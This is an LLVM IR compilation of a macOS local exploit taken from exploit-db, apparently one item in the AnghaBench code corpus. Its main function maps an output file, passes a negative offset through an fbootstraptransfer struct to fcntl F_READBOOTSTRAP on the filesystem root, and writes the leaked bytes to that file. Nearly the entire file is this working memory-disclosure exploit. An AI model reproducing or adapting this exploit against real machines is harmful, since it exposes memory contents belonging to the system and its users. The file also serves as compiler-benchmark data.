; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_35488.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_35488.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.fbootstraptransfer = type { i8*, i64, i64 }

@.str = private unnamed_addr constant [32 x i8] c"[*] Usage: %s [size] [outfile]\0A\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"[*] Failed to open output file.\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [24 x i8] c"[*] Not enough memory.\0A\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [37 x i8] c"[*] Failed to open filesystem root.\0A\00", align 1
@F_READBOOTSTRAP = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [19 x i8] c"[*] fcntl failed.\0A\00", align 1
@.str.6 = private unnamed_addr constant [42 x i8] c"[*] Successfully dumped %lu bytes to %s.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca %struct.fbootstraptransfer, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp ne i32 %12, 3
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i8* %17)
  store i32 -1, i32* %3, align 4
  br label %80

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i64 @atol(i8* %22)
  store i64 %23, i64* %9, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = load i32, i32* @O_RDWR, align 4
  %28 = load i32, i32* @O_CREAT, align 4
  %29 = or i32 %27, %28
  %30 = call i32 (i8*, i32, ...) @open(i8* %26, i32 %29, i32 420)
  store i32 %30, i32* %7, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %35

33:                                               ; preds = %19
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %80

35:                                               ; preds = %19
  %36 = load i32, i32* %7, align 4
  %37 = load i64, i64* %9, align 8
  %38 = call i32 @ftruncate(i32 %36, i64 %37)
  %39 = load i64, i64* %9, align 8
  %40 = load i32, i32* @PROT_READ, align 4
  %41 = load i32, i32* @PROT_WRITE, align 4
  %42 = or i32 %40, %41
  %43 = load i32, i32* @MAP_SHARED, align 4
  %44 = load i32, i32* %7, align 4
  %45 = call i64 @mmap(i32* null, i64 %39, i32 %42, i32 %43, i32 %44, i32 0)
  %46 = inttoptr i64 %45 to i8*
  store i8* %46, i8** %10, align 8
  %47 = load i8*, i8** %10, align 8
  %48 = load i8*, i8** @MAP_FAILED, align 8
  %49 = icmp eq i8* %47, %48
  br i1 %49, label %50, label %52

50:                                               ; preds = %35
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %80

52:                                               ; preds = %35
  %53 = load i8*, i8** %10, align 8
  %54 = getelementptr inbounds %struct.fbootstraptransfer, %struct.fbootstraptransfer* %11, i32 0, i32 0
  store i8* %53, i8** %54, align 8
  %55 = load i64, i64* %9, align 8
  %56 = mul nsw i64 %55, -1
  %57 = getelementptr inbounds %struct.fbootstraptransfer, %struct.fbootstraptransfer* %11, i32 0, i32 1
  store i64 %56, i64* %57, align 8
  %58 = load i64, i64* %9, align 8
  %59 = getelementptr inbounds %struct.fbootstraptransfer, %struct.fbootstraptransfer* %11, i32 0, i32 2
  store i64 %58, i64* %59, align 8
  %60 = load i32, i32* @O_RDONLY, align 4
  %61 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i32 %60)
  store i32 %61, i32* %6, align 4
  %62 = load i32, i32* %6, align 4
  %63 = icmp slt i32 %62, 0
  br i1 %63, label %64, label %66

64:                                               ; preds = %52
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %80

66:                                               ; preds = %52
  %67 = load i32, i32* %6, align 4
  %68 = load i32, i32* @F_READBOOTSTRAP, align 4
  %69 = call i32 @fcntl(i32 %67, i32 %68, %struct.fbootstraptransfer* %11)
  store i32 %69, i32* %8, align 4
  %70 = load i32, i32* %8, align 4
  %71 = icmp slt i32 %70, 0
  br i1 %71, label %72, label %74

72:                                               ; preds = %66
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %80

74:                                               ; preds = %66
  %75 = load i64, i64* %9, align 8
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 2
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.6, i64 0, i64 0), i64 %75, i8* %78)
  store i32 0, i32* %3, align 4
  br label %80

80:                                               ; preds = %74, %72, %64, %50, %33, %14
  %81 = load i32, i32* %3, align 4
  ret i32 %81
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @atol(i8*) #1

declare dso_local i32 @open(i8*, i32, ...) #1

declare dso_local i32 @ftruncate(i32, i64) #1

declare dso_local i64 @mmap(i32*, i64, i32, i32, i32, i32) #1

declare dso_local i32 @fcntl(i32, i32, %struct.fbootstraptransfer*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
